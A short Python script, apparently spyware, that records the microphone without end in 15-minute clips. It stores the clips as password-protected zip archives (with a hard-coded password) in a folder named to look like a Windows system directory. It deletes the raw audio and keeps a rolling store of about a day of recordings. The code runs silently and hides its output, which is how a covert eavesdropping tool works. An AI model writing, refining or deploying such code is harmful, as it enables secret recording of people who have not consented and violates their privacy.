import time
import sounddevice as sd
from scipy.io.wavfile import write
import wavio as wv
import os
import pyminizip
from random import randint
import glob

os.chdir('C:\\Windows\System64')

while True:
    for item in glob.glob("*.wav"):
        os.remove(os.path.join(os.getcwd(), item))

    
    freq = 44100
    duration = 15*60
    recording = sd.rec(int(duration * freq),
                                    samplerate=freq, channels=2)
    sd.wait()
    name = time.asctime().replace(':', "_")+".wav"
    wv.write(name, recording, freq, sampwidth=2)

    if(len(glob.glob("*.zip")) >= 96):
        print('file deleted')
        os.remove(os.path.join(os.getcwd(), min(glob.iglob('*.zip'), key=os.path.getctime)))

    x = time.asctime().split(' ')
    zipName = x[1]+x[2]+'_'+x[3].replace(':','_')+'.zip'
    pyminizip.compress(name, None, 'stuff.zip' , None, 5)
    pyminizip.compress('stuff.zip', None, zipName ,"akjjyglc6969", 5)
    os.remove('stuff.zip')
    print('operated')
